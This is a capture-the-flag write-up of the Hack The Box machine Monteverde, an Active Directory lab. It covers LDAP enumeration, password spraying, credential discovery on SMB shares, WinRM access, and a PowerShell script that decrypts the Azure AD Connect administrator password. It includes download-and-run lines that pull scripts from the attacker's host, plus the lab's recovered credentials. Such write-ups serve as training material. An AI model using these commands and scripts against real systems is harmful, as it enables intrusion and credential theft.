---
title: "[HTB] Monteverde"
permalink: /writeups/htb/monteverde/
excerpt: "Краткий разбор машины Monteverde с Hack The Box."
tags:
  - hackthebox
  - htb
  - activedirectory
  - pentest
  - writeup
  - bloodhound
  - azure
  - enumeration
---

---

{% include toc icon="cog" title="Monteverde Solution" %}

The [Monteverde](https://app.hackthebox.com/machines/monteverde) machine has been created by [egre55](https://app.hackthebox.com/users/1190). This is a **medium** Windows Machine with a strong focus on Active Directory enumeration and exploitation. 

If you didn't solve this challenge and just look for answers, first, you should take a look at this [mind map](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg) from [Orange Cyberdefense](https://github.com/Orange-Cyberdefense) and try again. It could give you some hints about interesting attack paths when dealing with an Active Directory.
{: .text-justify}

![image-center](/images/htb/htb_monteverde_infocard.png){: .align-center}

**Заметка:** Все действия против целевой машины выполнялись со стандартной системой *Kali Linux*. Скачать Kali можно с официального сайта [здесь](https://www.kali.org/).
{: .notice--info}

# Разведка

In a penetration test or red team, reconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. 

This information can then be leveraged by an adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute initial access, to scope and prioritize post-compromise objectives, or to drive and lead further reconnaissance efforts. Here, our only piece of information is an IP address. 

## Сканирование Nmap

Let's start with a classic service scan with [Nmap](https://nmap.org/). Note the **-sV** switch which enables *version detection* and allows Nmap to check its internal database to try to determine the service protocol, application name and version number.

**Заметка:** После запуска HTB-машины всегда подожди несколько минут, чтобы убедиться, что все сервисы поднялись корректно. Если просканировать машину сразу, можно пропустить порты, которые должны быть открыты.
{: .notice--info}

```bash
$ nmap -Pn -sV 10.129.209.96 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-13 06:36 EDT
Nmap scan report for 10.129.209.96
Host is up (0.018s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-13 10:36:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Помни:** По умолчанию **Nmap** сканирует 1000 самых распространенных TCP-портов на целевых хостах. Если нужно сканировать больше портов или изменить поведение по умолчанию, обязательно прочитай [документацию](https://nmap.org/docs.html).
{: .notice--warning}

As we can see, the machine seems to be a domain controller for **megabank.local** and we have a few interesting services including **SMB** (TCP/445) and **LDAP** (TCP/389).

## LDAP

First, we can try an anonymous bind on the LDAP port using [ldapsearch](https://linux.die.net/man/1/ldapsearch) to look for some information. Here, we used the `grep` command to look for the **userPrincipalName** attribute that specifies the UPN of the users.

```bash
$ ldapsearch -x -b "dc=megabank,dc=local" "*" -H ldap://10.129.209.96  | grep userPrincipalName 
userPrincipalName: mhope@MEGABANK.LOCAL
userPrincipalName: SABatchJobs@MEGABANK.LOCAL
userPrincipalName: svc-ata@MEGABANK.LOCAL
userPrincipalName: svc-bexec@MEGABANK.LOCAL
userPrincipalName: svc-netapp@MEGABANK.LOCAL
userPrincipalName: dgalanos@MEGABANK.LOCAL
userPrincipalName: roleary@MEGABANK.LOCAL
userPrincipalName: smorgan@MEGABANK.LOCAL
```

Nice, the *anonymous* bind worked and we got some usernames. 

# Первичный доступ

We got a list of usernames but no password. In a real-world scenario, we could try to find valid credentials through password spraying with a list of weak passwords.

## Password spraying

As stated by [MITRE](https://attack.mitre.org/techniques/T1110/003/), adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password, or a small list of commonly used passwords, that may match the complexity policy of the domain.

Since we have a list of usernames, we can use [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), to see if one of the accounts is using its username as password. Note that we use the `--continue-on-success` to make sure that `crackmapexec` will go through the entire list of usernames, even if a valid account is discovered.

```bash
$ crackmapexec smb 10.129.209.96 -u users.txt -p users.txt --continue-on-success
SMB         10.129.209.96    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.209.96    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
SMB         10.129.209.96    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.209.96    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
SMB         10.129.209.96    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
SMB         10.129.209.96    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
SMB         10.129.209.96    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.209.96    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
SMB         10.129.209.96    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
SMB         10.129.209.96    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.129.209.96    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 

...[snip]...

```

Nice, we do have a password for the **SABatchJobs** user (`SABatchJobs`). Again, with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), we can check if the user's password is properly working. Here we used the *winrm* switch to specify the *WinRM* protocol. 

```bash
$ crackmapexec winrm 10.129.209.96 -u SABatchJobs -p SABatchJobs
SMB         10.129.209.96    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
HTTP        10.129.209.96    5985   MONTEVERDE       [*] http://10.129.209.96:5985/wsman
WINRM       10.129.209.96    5985   MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

Nice!

## Shared Folders

Let's see if this user has any access to shared folder.

```bash
$ crackmapexec smb 10.129.209.96 -u SABatchJobs -p SABatchJobs --shares
SMB         10.129.209.96    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.209.96    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.209.96    445    MONTEVERDE       [+] Enumerated shares
SMB         10.129.209.96    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.209.96    445    MONTEVERDE       -----           -----------     ------
SMB         10.129.209.96    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.209.96    445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.209.96    445    MONTEVERDE       C$                              Default share
SMB         10.129.209.96    445    MONTEVERDE       E$                              Default share
SMB         10.129.209.96    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.209.96    445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.209.96    445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.209.96    445    MONTEVERDE       users$          READ            
```

It seems that we have a **READ** access right on multiple folders. Let's start by checking the **users$** folder. Here, we can use [impacket-smbclient](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py) to explore the folder.

```bash
$ impacket-smbclient SABatchJobs:SABatchJobs@10.129.209.96
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Type help for list of commands
# use users$
# ls
drw-rw-rw-          0  Fri Jan  3 08:12:48 2020 .
drw-rw-rw-          0  Fri Jan  3 08:12:48 2020 ..
drw-rw-rw-          0  Fri Jan  3 08:15:23 2020 dgalanos
drw-rw-rw-          0  Fri Jan  3 08:41:18 2020 mhope
drw-rw-rw-          0  Fri Jan  3 08:14:56 2020 roleary
drw-rw-rw-          0  Fri Jan  3 08:14:28 2020 smorgan
# cd mhope
# ls
drw-rw-rw-          0  Fri Jan  3 08:41:18 2020 .
drw-rw-rw-          0  Fri Jan  3 08:41:18 2020 ..
-rw-rw-rw-       1212  Fri Jan  3 09:59:24 2020 azure.xml
# get azure.xml
```

After looking around, you will find the **azure.xml** file in the **mhope** folder which seems to contain a password.

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

Given we found the password in the **mhope** folder, we will try to login with this username.

```bash
$ crackmapexec winrm 10.129.209.96 -u mhope -p '4n0therD4y@n0th3r$'
SMB         10.129.209.96    5985   MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
HTTP        10.129.209.96    5985   MONTEVERDE       [*] http://10.129.209.96:5985/wsman
WINRM       10.129.209.96    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```

Awesome!

## WinRM

Using [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and the recovered account, we can try to connect to the remote machine.

```bash
$ evil-winrm -i 10.129.209.96 -u mhope -p '4n0therD4y@n0th3r$'

Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> dir C:\Users\mhope\Desktop


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         1/3/2020   5:48 AM             32 user.txt
```

We got our **first flag**!

# Повышение привилегий

According to the MITRE, [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) consists of techniques that adversaries use to gain higher-level permission on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permission to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities.

Let's start with host reconnaissance to see if we can find an attack path to get local admin privileges.

## Host Recon

Using [PrivescCheck](https://github.com/itm4n/PrivescCheck), a script that aims to enumerate common Windows configuration issues, let's try to enumerate common Windows configuration issues that can be leveraged for local privilege escalation.

Note that we used the local **Apache** service to host the file and download it from the remote machine. Also, the `-Extended` flag aims to gather more information.

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.43/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended

...[snip]...

+------+------------------------------------------------+------+
| TEST | USER > Groups                                  | INFO |
+------+------------------------------------------------+------+
| DESC | List all the groups that are associated to the        |
|      | current user's token.                                 |
+------+-------------------------------------------------------+
[*] Found 11 result(s).

Name                                        Type           SID
----                                        ----           ---
MEGABANK\Domain Users                       Group          S-1-5-21-391775091-850290835-3566037492-513
Everyone                                    WellKnownGroup S-1-1-0
BUILTIN\Remote Management Users             Alias          S-1-5-32-580
BUILTIN\Users                               Alias          S-1-5-32-545
BUILTIN\Pre-Windows 2000 Compatible Access  Alias          S-1-5-32-554
NT AUTHORITY\NETWORK                        WellKnownGroup S-1-5-2
NT AUTHORITY\Authenticated Users            WellKnownGroup S-1-5-11
NT AUTHORITY\This Organization              WellKnownGroup S-1-5-15
MEGABANK\Azure Admins                       Group          S-1-5-21-391775091-850290835-3566037492-2601
NT AUTHORITY\NTLM Authentication            WellKnownGroup S-1-5-64-10
Mandatory Label\Medium Plus Mandatory Level Label          S-1-16-8448

...[snip]...

+------+------------------------------------------------+------+
| TEST | APPS > Non-default Apps                        | INFO |
+------+------------------------------------------------+------+
| DESC | Enumerate non-default and third-party applications by |
|      | parsing the registry.                                 |
+------+-------------------------------------------------------+
[*] Found 15 result(s).

Name                                              FullName
----                                              --------
Google                                            C:\Program Files (x86)\Google
Microsoft Analysis Services                       C:\Program Files (x86)\Microsoft Analysis Services
Microsoft Help Viewer                             C:\Program Files (x86)\Microsoft Help Viewer
v2.3                                              C:\Program Files (x86)\Microsoft Help Viewer\v2.3
Microsoft SQL Server                              C:\Program Files (x86)\Microsoft SQL Server
Microsoft SQL Server Management Studio 18         C:\Program Files (x86)\Microsoft SQL Server Management Studio 18
Microsoft Analysis Services                       C:\Program Files\Microsoft Analysis Services
Microsoft Azure Active Directory Connect          C:\Program Files\Microsoft Azure Active Directory Connect
Microsoft Azure Active Directory Connect Upgrader C:\Program Files\Microsoft Azure Active Directory Connect Upgrader
Microsoft Azure AD Connect Health Sync Agent      C:\Program Files\Microsoft Azure AD Connect Health Sync Agent
Microsoft Azure AD Sync                           C:\Program Files\Microsoft Azure AD Sync
Microsoft SQL Server                              C:\Program Files\Microsoft SQL Server
Microsoft Visual Studio 10.0                      C:\Program Files\Microsoft Visual Studio 10.0
VMware                                            C:\Program Files\VMware
VMware Tools                                      C:\Program Files\VMware\VMware Tools

...[snip]...

```
Here we can see that **Microsoft SQL Server** and **AD Connect** are installed. According to this blog [post](https://blog.xpnsec.com/azuread-connect-for-redteam/) there is a way to exploit the Azure AD (AAD) Sync service.

## Password Hash Synchronization

If you properly read the post, you know that there is a user that is set up to handle replication of Active Directory to Azure. Usually, that's an account starting by **MSOL_**. 

However, it is not the case here.

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -S 10.129.209.96 -Q "declare @Message varchar(1000); use ADsync; set @Message = (SELECT private_configuration_xml FROM mms_management_agent WHERE ma_type='AD'); print @Message"
Changed database context to 'ADSync'.
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL</forest-login-domain>
 <sign-and-seal>1</sign-and-seal>
 <ssl-bind crl-check="0">0</ssl-bind>
 <simple-bind>0</simple-bind>
 <default-ssl-strength>0</default-ssl-strength>
 <parameter-values>
  <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">administrator</parameter>
  <parameter name="password" type="encrypted-string" use="connectivity" dataType="String" encrypted="1" />
  <parameter name="forest-name" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</par
```

Here, we can see that the *forest-login-user* is in fact **administrator**. It means that if we exploit this issue, we would be able to recover the password of the administrator account!

Here we will reuse the script found [here](https://gist.githubusercontent.com/xpn/0dc393e944d8733e3c63023968583545/raw/d45633c954ee3d40be1bff82648750f516cd3b80/azuread_decrypt_msol.ps1).

```bash
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=10.129.228.111;Database=ADSync;Trusted_Connection=true"
$client.Open()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

Then, we can host it locally and execute it on the target machine.

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.43/getcreds.ps1');
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

Great, we now have credentials (`administrator:d0m@in4dminyeah!`) for the **administrator** account. Now we can connect on the remote machine with administrative privileges and read the **second flag**.

```bash
$ crackmapexec smb 10.129.209.96 -u Administrator -p 'd0m@in4dminyeah!' 
SMB         10.129.209.96   445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.209.96   445    MONTEVERDE       [+] MEGABANK.LOCAL\Administrator:d0m@in4dminyeah! (Pwn3d!)
             
$ crackmapexec smb 10.129.209.96 -u Administrator -p 'd0m@in4dminyeah!' -x "dir c:\Users\Administrator\Desktop\root.txt"
SMB         10.129.209.96   445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.209.96   445    MONTEVERDE       [+] MEGABANK.LOCAL\Administrator:d0m@in4dminyeah! (Pwn3d!)
SMB         10.129.209.96   445    MONTEVERDE       [+] Executed command 
SMB         10.129.209.96   445    MONTEVERDE       Volume in drive C has no label.
SMB         10.129.209.96   445    MONTEVERDE       Volume Serial Number is E8F9-4F1E
SMB         10.129.209.96   445    MONTEVERDE       
SMB         10.129.209.96   445    MONTEVERDE       Directory of c:\Users\Administrator\Desktop
SMB         10.129.209.96   445    MONTEVERDE       
SMB         10.129.209.96   445    MONTEVERDE       01/03/2020  06:48 AM                32 root.txt
SMB         10.129.209.96   445    MONTEVERDE       1 File(s)             32 bytes
SMB         10.129.209.96   445    MONTEVERDE       0 Dir(s)   6,102,245,376 bytes free
```

Awesome! I hope you enjoyed it, I know I did :)
